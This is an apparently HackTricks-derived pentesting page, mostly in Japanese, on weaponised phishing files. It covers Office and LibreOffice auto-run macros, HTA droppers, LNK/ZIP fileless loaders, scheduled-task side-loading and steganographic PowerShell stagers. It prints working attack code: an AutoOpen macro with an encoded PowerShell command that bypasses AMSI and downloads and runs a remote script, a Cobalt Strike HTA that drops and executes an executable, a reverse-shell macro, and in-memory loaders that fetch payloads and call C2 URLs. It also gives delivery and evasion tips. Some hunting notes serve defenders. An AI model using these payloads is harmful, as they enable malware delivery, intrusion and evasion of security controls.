# Phishing Files & Documents

{{#include ../../banners/hacktricks-training.md}}

## Office Documents

Microsoft Word は、ファイルを開く前にファイルデータの検証を行います。データ検証は、OfficeOpenXML 標準に対するデータ構造の識別という形で行われます。データ構造の識別中に何らかのエラーが発生した場合、解析中のファイルは開かれません。

通常、macro を含む Word ファイルは `.docm` 拡張子を使用します。ただし、ファイル拡張子を変更してファイル名をリネームしても、macro の実行能力を維持できます。\
たとえば、RTF ファイルは設計上 macros をサポートしませんが、RTF にリネームされた DOCM ファイルは Microsoft Word によって処理され、macro を実行できます。\
同じ内部構造と仕組みは、Microsoft Office Suite のすべてのソフトウェア（Excel、PowerPoint など）に適用されます。

一部の Office プログラムでどの拡張子が実行されるかを確認するには、次のコマンドを使用できます：
```bash
assoc | findstr /i "word excel powerp"
```
DOCXファイルは、マクロを含むリモートテンプレート（File –Options –Add-ins –Manage: Templates –Go）を参照している場合、マクロも「実行」できます。

### External Image Load

Go to: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![Office Documents - External Image Load: Go to: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Macros Backdoor

マクロを使って、文書から任意のコードを実行することが可能です。

#### Autoload functions

それらが一般的であるほど、AVに検知される可能性が高くなります。

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### 手動でメタデータを削除する

**File > Info > Inspect Document > Inspect Document** に移動すると、Document Inspector が開きます。**Inspect** をクリックし、**Document Properties and Personal Information** の横にある **Remove All** をクリックします。

#### Doc Extension

完了したら、**Save as type** のドロップダウンを選択し、形式を **`.docx`** から **Word 97-2003 `.doc`** に変更します。\
これは、**`.docx`** 内に macro を保存できず、macro 対応の **`.docm`** 拡張子には **stigma** が **around** あるためです（例: サムネイルのアイコンに大きな `!` が表示され、一部の web/email gateway はそれらを完全にブロックします）。そのため、この **legacy `.doc` 拡張子が最適な妥協案** です。

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT auto-run macros (Basic)

LibreOffice Writer documents can embed Basic macros and auto-execute them when the file is opened by binding the macro to the **Open Document** event (Tools → Customize → Events → Open Document → Macro…). A simple reverse shell macro looks like:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Note the doubled quotes (`""`) inside the string – LibreOffice Basic uses them to escape literal quotes, so payloads that end with `...==""")` keep both the inner command and the Shell argument balanced.

Delivery tips:

- Save as `.odt` and bind the macro to the document event so it fires immediately when opened.
- When emailing with `swaks`, use `--attach @resume.odt` (the `@` is required so the file bytes, not the filename string, are sent as the attachment). This is critical when abusing SMTP servers that accept arbitrary `RCPT TO` recipients without validation.

## HTA Files

An HTA is a Windows program that **combines HTML and scripting languages (such as VBScript and JScript)**. It generates the user interface and executes as a "fully trusted" application, without the constraints of a browser's security model.

An HTA is executed using **`mshta.exe`**, which is typically **installed** along with **Internet Explorer**, making **`mshta` dependant on IE**. So if it has been uninstalled, HTAs will be unable to execute.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM Authenticationの強制

**NTLM authenticationを「リモートで」強制する**方法はいくつかあります。たとえば、ユーザーがアクセスするメールやHTMLに**見えない画像**を追加できます（HTTP MitMでも？）。または、被害者に**フォルダを開くだけで****authentication**を**トリガー**する**ファイルのアドレス**を送ることもできます。

**これらのアイデアや他の方法は、次のページを確認してください:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

hashやauthenticationを盗むだけでなく、**NTLM relay attacks**も**実行**できることを忘れないでください:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

非常に効果的なキャンペーンでは、2つの正規の囮ドキュメント（PDF/DOCX）と悪意のある .lnk を含むZIPが配布されます。仕組みは、実際のPowerShell loaderがZIPの生バイト列内に固有のマーカーの後ろへ格納されており、.lnkがそれを切り出して完全にメモリ上で実行する、というものです。

.lnkのPowerShell one-linerで実装される典型的な流れ:

1) 共通のパスで元のZIPを見つける: Desktop、Downloads、Documents、%TEMP%、%ProgramData%、および現在の作業ディレクトリの親。
2) ZIPのバイト列を読み取り、ハードコードされたマーカー（例: xFIQCV）を見つける。そのマーカー以降すべてが埋め込まれたPowerShell payload。
3) ZIPを%ProgramData%へコピーし、そこで展開して、正規に見せるために囮の .docx を開く。
4) 現在のプロセスでAMSIを回避する: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) 次のstageを難読化解除する（例: すべての#文字を削除）して、メモリ上で実行する。

埋め込まれたstageを切り出して実行するPowerShell skeletonの例:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notes
- 配信は信頼性の高い PaaS サブドメイン（例: *.herokuapp.com）を悪用することが多く、IP/UA に基づいてペイロードをゲートすることがある（条件付きで benign ZIP を配信）。
- 次のステージはしばしば base64/XOR で暗号化された shellcode を復号し、Reflection.Emit + VirtualAlloc で実行してディスク上の痕跡を最小化する。

同じチェーンで使われた Persistence
- Microsoft Web Browser control の COM TypeLib hijacking により、IE/Explorer あるいはそれを埋め込んだ任意の app が payload を自動再起動する。詳細とすぐ使えるコマンドはここを参照:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP files に ASCII marker string（例: xFIQCV）が archive data に付加されている。
- .lnk が親/user フォルダを列挙して ZIP を見つけ、decoy document を開く。
- AMSI の改ざんを [System.Management.Automation.AmsiUtils]::amsiInitFailed ിലൂടെ行う。
- 長時間実行される business threads が trusted PaaS domains 配下のリンクで終わる。

## LNK decoy-first staging → scheduled-task persistence → trusted CPL side-loading

別のよくあるパターンは、**document-impersonating `.lnk`** が即座に benign lure を開きつつ、バックグラウンドで実際のチェーンをステージするもの。

観測された workflow:
1. ショートカットは **PDF を装い**、conhost.exe か同様の proxy を使って難読化された PowerShell downloader を起動する。
2. PowerShell は明白な token（`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`）を分割し、`iwr`, `gci`, `ren`, `cpi`, `schtasks` を探す単純な検知を回避する。
3. stager は **decoy document を先に** ダウンロードして被害者に開かせ、その後、バックグラウンドで malicious files を再構築する。
4. payload は **junk extensions** 付きで書き込まれ、その後 filler characters を削って rename されるため、明白な `.exe` / `.cpl` artifact の出現が遅れる。
5. Persistence は、ユーザー書き込み可能な path から trusted host binary を起動する **minute-based scheduled task** で確立される。

このパターンから得られる最小限の hunting clues:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
A useful staging layout to recognize is:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` or `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Why the second stage is stealthy

In the Rapid7 case study, the scheduled task repeatedly launched **`Fondue.exe`** from `C:\Users\Public\`. Because **`APPWIZ.cpl`** was staged next to it and exported **`RunFODW`**, the trusted Microsoft binary side-loaded the attacker CPL instead of the legitimate system copy.

The CPL then:
- Reads an **AES-256-CBC** blob from `C:\Windows\Tasks\editor.dat`
- Decrypts it through **Windows CNG / `bcrypt.dll`**
- Allocates executable memory and copies the decrypted shellcode
- Executes it indirectly by passing the shellcode pointer as the callback for **`EnumUILanguagesW`**

That last step is worth hunting separately: malware often avoids a direct `((void(*)())buf)()` jump and instead abuses a **legitimate callback-taking WinAPI** to transfer execution.

The decrypted payload in this campaign was **Donut** shellcode, which then mapped the final PE fully in memory and patched **AMSI/WLDP/ETW** in the current process before handing off execution. For deeper notes on side-loading and memory-resident post-processing, see:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Practical hunting pivots:
- `.lnk` spawning `powershell.exe` or `conhost.exe` followed by a visible decoy document.
- Short-lived downloads to **`C:\Users\Public\`** followed by immediate renames from nonsense extensions.
- Scheduled tasks with bland names such as `GoogleErrorReport` executing from **user-writable directories**.
- Trusted binaries loading **`.cpl` / `.dll`** files from the same non-system directory.
- Base64 text blobs written under **`C:\Windows\Tasks\`** and then read by the side-loaded module.

## Steganography-delimited payloads in images (PowerShell stager)

Recent loader chains deliver an obfuscated JavaScript/VBS that decodes and runs a Base64 PowerShell stager. That stager downloads an image (often GIF) that contains a Base64-encoded .NET DLL hidden as plain text between unique start/end markers. The script searches for these delimiters (examples seen in the wild: «<<sudo_png>> … <<sudo_odt>>>»), extracts the between-text, Base64-decodes it to bytes, loads the assembly in-memory and invokes a known entry method with the C2 URL.

Workflow
- Stage 1: Archived JS/VBS dropper → decodes embedded Base64 → launches PowerShell stager with -nop -w hidden -ep bypass.
- Stage 2: PowerShell stager → downloads image, carves marker-delimited Base64, loads the .NET DLL in-memory and calls its method (e.g., VAI) passing the C2 URL and options.
- Stage 3: Loader retrieves final payload and typically injects it via process hollowing into a trusted binary (commonly MSBuild.exe). See more about process hollowing and trusted utility proxy execution here:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell example to carve a DLL from an image and invoke a .NET method in-memory:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

ノート
- これは ATT&CK T1027.003 (steganography/marker-hiding) です。マーカーは campaign ごとに異なります。
- AMSI/ETW bypass と string deobfuscation は、assembly を読み込む前に一般的に適用されます。
- Hunting: 既知の区切り文字について downloaded images をスキャンし、PowerShell が images にアクセスして即座に Base64 blobs を decode しているかを確認します。

stego tools と carving techniques も参照:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

繰り返し使われる initial stage は、archive 内で配布される小さく強く obfuscated された `.js` または `.vbs` です。その唯一の目的は、埋め込まれた Base64 string を decode し、`-nop -w hidden -ep bypass` 付きで PowerShell を起動して、HTTPS 経由で次の stage を bootstrap することです。

Skeleton logic (abstract):
- 自身の file contents を読み取る
- junk strings の間にある Base64 blob を見つける
- ASCII PowerShell に decode する
- `wscript.exe`/`cscript.exe` から `powershell.exe` を呼び出して execute する

Hunting cues
- Archived JS/VBS attachments が command line に `-enc`/`FromBase64String` を含めて `powershell.exe` を起動する。
- `wscript.exe` が user temp paths から `powershell.exe -nop -w hidden` を起動する。

## Windows files to steal NTLM hashes

**places to steal NTLM creds** についてのページを確認してください:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Rapid7 – Malware à la Mode: Tracking Dropping Elephant Tradecraft Through a China-Themed Loader Chain](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
